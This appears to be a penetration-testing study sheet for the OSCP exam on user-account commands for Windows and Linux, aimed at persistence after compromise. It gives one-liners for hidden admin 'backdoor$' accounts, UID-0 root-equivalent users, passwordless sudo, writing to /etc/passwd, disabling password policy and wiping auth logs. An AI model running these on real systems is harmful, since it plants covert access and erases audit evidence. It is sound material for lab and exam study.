# User Management Commands

tags: #Reference #User_Management #Windows #Linux #Foundational

> [!info] Commands for adding, modifying, and managing users on Windows and Linux systems. Essential for persistence and privilege escalation.

## Windows User Management

### Adding Users

#### Basic User Creation

```cmd
net user <Username> <Password> /add
```

```cmd
# Example
net user hacker Password123! /add
```

#### Add User to Administrators Group

```cmd
net localgroup Administrators <Username> /add
```

```cmd
# Example
net localgroup Administrators hacker /add
```

#### Combined Command

```cmd
net user hacker Password123! /add && net localgroup Administrators hacker /add
```

### Add User to Remote Desktop Users

```cmd
net localgroup "Remote Desktop Users" <Username> /add
```

```cmd
# Example
net localgroup "Remote Desktop Users" hacker /add
```

### Complete User Setup

```cmd
# Create user, add to admins and RDP
net user hacker Password123! /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add
```

### PowerShell User Creation

```powershell
# Create user
New-LocalUser -Name "hacker" -Password (ConvertTo-SecureString "Password123!" -AsPlainText -Force)

# Add to Administrators
Add-LocalGroupMember -Group "Administrators" -Member "hacker"

# Add to Remote Desktop Users
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "hacker"
```

### Viewing Users

```cmd
# List all users
net user

# View specific user details
net user <Username>

# List administrators
net localgroup Administrators

# List Remote Desktop Users
net localgroup "Remote Desktop Users"
```

### Modifying Users

```cmd
# Change password
net user <Username> <NewPassword>

# Disable user
net user <Username> /active:no

# Enable user
net user <Username> /active:yes

# Delete user
net user <Username> /delete
```

### Domain User Management

```cmd
# Add domain user (requires domain admin)
net user <Username> <Password> /add /domain

# Add to domain admins
net group "Domain Admins" <Username> /add /domain

# View domain users
net user /domain

# View domain admins
net group "Domain Admins" /domain
```

## Linux User Management

### Adding Users

#### Using adduser (Interactive)

```bash
adduser <username>
```

> [!info] Interactive command that prompts for password and user information.

```bash
# Example
sudo adduser hacker
# Enter password when prompted
```

#### Using useradd (Non-Interactive)

```bash
useradd <username>
```

```bash
# Create user with home directory
useradd -m <username>

# Create user with specific shell
useradd -m -s /bin/bash <username>

# Set password
passwd <username>
```

#### Complete User Setup

```bash
# Create user with home directory and bash shell
sudo useradd -m -s /bin/bash hacker

# Set password
sudo passwd hacker
# Enter password when prompted
```

### Adding User to sudo Group

```bash
# Debian/Ubuntu
sudo usermod -aG sudo <username>

# RHEL/CentOS
sudo usermod -aG wheel <username>
```

```bash
# Example
sudo usermod -aG sudo hacker
```

### Adding User with Specific UID/GID

```bash
useradd -u <UID> -g <group> <username>
```

```bash
# Example - Create user with UID 1500
sudo useradd -u 1500 -m -s /bin/bash hacker
```

### Viewing Users

```bash
# List all users
cat /etc/passwd

# List only usernames
cat /etc/passwd | cut -d: -f1

# View specific user
id <username>

# View groups for user
groups <username>

# List sudo users (Debian/Ubuntu)
getent group sudo

# List wheel users (RHEL/CentOS)
getent group wheel
```

### Modifying Users

```bash
# Change password
sudo passwd <username>

# Change shell
sudo usermod -s /bin/bash <username>

# Add to group
sudo usermod -aG <group> <username>

# Change home directory
sudo usermod -d /new/home <username>

# Lock user account
sudo usermod -L <username>

# Unlock user account
sudo usermod -U <username>

# Delete user
sudo userdel <username>

# Delete user and home directory
sudo userdel -r <username>
```

## Privilege Escalation via User Creation

### Windows - Create Admin User

```cmd
# Method 1: Using net commands
net user backdoor Password123! /add
net localgroup Administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add
```

```powershell
# Method 2: Using PowerShell
$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
New-LocalUser -Name "backdoor" -Password $pass
Add-LocalGroupMember -Group "Administrators" -Member "backdoor"
```

### Linux - Create Root-Equivalent User

```bash
# Create user with UID 0 (root equivalent)
sudo useradd -u 0 -o -g 0 -M -s /bin/bash backdoor
sudo passwd backdoor
```

> [!warning] User with UID 0 has root privileges!

### Linux - Add User to sudo Without Password

```bash
# Edit sudoers file
sudo visudo

# Add this line
hacker ALL=(ALL) NOPASSWD:ALL
```

```bash
# Or add to sudoers.d
echo "hacker ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/hacker
```

## Persistence via User Accounts

### Windows Hidden User

```cmd
# Create user
net user backdoor$ Password123! /add

# Add to administrators
net localgroup Administrators backdoor$ /add

# Hide from login screen (requires registry edit)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor$ /t REG_DWORD /d 0 /f
```

### Linux Hidden User

```bash
# Create user with no home directory
sudo useradd -M -s /bin/bash backdoor

# Set password
sudo passwd backdoor

# Add to sudo group
sudo usermod -aG sudo backdoor

# Hide from login screen (optional)
sudo usermod -s /usr/sbin/nologin backdoor
```

## Complete Workflow Examples

### Example 1: Windows Post-Exploitation

```cmd
# After getting SYSTEM shell
whoami
# Output: nt authority\system

# Create persistent admin user
net user hacker Password123! /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add

# Verify
net user hacker
net localgroup Administrators
```

### Example 2: Linux Post-Exploitation

```bash
# After getting root shell
whoami
# Output: root

# Create persistent sudo user
useradd -m -s /bin/bash hacker
passwd hacker
# Enter password: Password123!

# Add to sudo group
usermod -aG sudo hacker

# Verify
id hacker
groups hacker
```

### Example 3: Using DeadPotato (Windows)

```cmd
# Create admin user with DeadPotato
DeadPotato.exe -newadmin hacker:Password123!

# Verify
net localgroup Administrators

# Login via RDP
# xfreerdp3 /u:hacker /p:'Password123!' /v:<TargetIP>
```

### Example 4: Writable /etc/passwd (Linux)

```bash
# Generate password hash
openssl passwd Password123!
# Output: $1$xyz$abc123...

# Add user to /etc/passwd
echo 'hacker:$1$xyz$abc123...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login as new user
su hacker
# Password: Password123!
```

## Verification Commands

### Windows

```cmd
# Check if user exists
net user <username>

# Check if user is admin
net localgroup Administrators | findstr <username>

# Check if user can RDP
net localgroup "Remote Desktop Users" | findstr <username>

# Test login
runas /user:<username> cmd
```

### Linux

```bash
# Check if user exists
id <username>

# Check if user has sudo
sudo -l -U <username>

# Check user's groups
groups <username>

# Test login
su - <username>
```

## Troubleshooting

### Windows - User Creation Fails

```cmd
# Check if you have admin rights
whoami /priv

# Try with full path
C:\Windows\System32\net.exe user hacker Password123! /add
```

### Windows - Password Policy Violation

```cmd
# Use stronger password
net user hacker P@ssw0rd123! /add

# Or disable password complexity (if admin)
secedit /export /cfg C:\secpol.cfg
# Edit PasswordComplexity = 0
secedit /configure /db C:\Windows\security\local.sdb /cfg C:\secpol.cfg
```

### Linux - Permission Denied

```bash
# Ensure you're root
sudo -i

# Or use sudo with commands
sudo useradd -m hacker
sudo passwd hacker
```

### Linux - User Already Exists

```bash
# Delete existing user first
sudo userdel -r <username>

# Then create new user
sudo useradd -m <username>
```

## Security Considerations

> [!warning] Creating users leaves obvious traces:
> - Event logs (Windows)
> - /var/log/auth.log (Linux)
> - User account listings
> - Login history

### Cleanup

```cmd
# Windows - Remove user
net user <username> /delete

# Remove from groups first if needed
net localgroup Administrators <username> /delete
```

```bash
# Linux - Remove user
sudo userdel -r <username>

# Clear auth logs (if root)
echo > /var/log/auth.log
```

## OSCP Exam Tips

> [!tip] In OSCP exam:
> - Create users for persistence after getting admin/root
> - Document credentials you create
> - Use strong passwords (Password123!)
> - Add to RDP/sudo for easy re-access
> - Test login before moving on

### Quick Exam Commands

```cmd
# Windows - Quick admin user
net user oscp P@ssw0rd123! /add && net localgroup Administrators oscp /add && net localgroup "Remote Desktop Users" oscp /add
```

```bash
# Linux - Quick sudo user
sudo useradd -m -s /bin/bash oscp && sudo passwd oscp && sudo usermod -aG sudo oscp
```

## Common Use Cases

### Persistence After Exploitation

```plaintext
1. Get initial shell
2. Escalate to admin/root
3. Create persistent user account
4. Add to admin/sudo group
5. Enable RDP/SSH access
6. Test login
7. Document credentials
```

### Lateral Movement

```plaintext
1. Compromise machine A
2. Create user on machine A
3. Use same credentials on machine B
4. Credential reuse often works
```

### Maintaining Access

```plaintext
1. Create multiple user accounts
2. Use different passwords
3. Add to different groups
4. Hide some accounts
5. Document all accounts
```

## Quick Reference

### Windows One-Liners

```cmd
# Create admin user
net user hacker P@ss123! /add && net localgroup Administrators hacker /add

# Create RDP user
net user rdp P@ss123! /add && net localgroup "Remote Desktop Users" rdp /add

# Create hidden admin
net user backdoor$ P@ss123! /add && net localgroup Administrators backdoor$ /add
```

### Linux One-Liners

```bash
# Create sudo user
sudo useradd -m -s /bin/bash hacker && sudo passwd hacker && sudo usermod -aG sudo hacker

# Create root-equivalent user
sudo useradd -u 0 -o -g 0 -M -s /bin/bash backdoor && sudo passwd backdoor

# Create user with no password sudo
sudo useradd -m -s /bin/bash hacker && echo "hacker ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/hacker
```
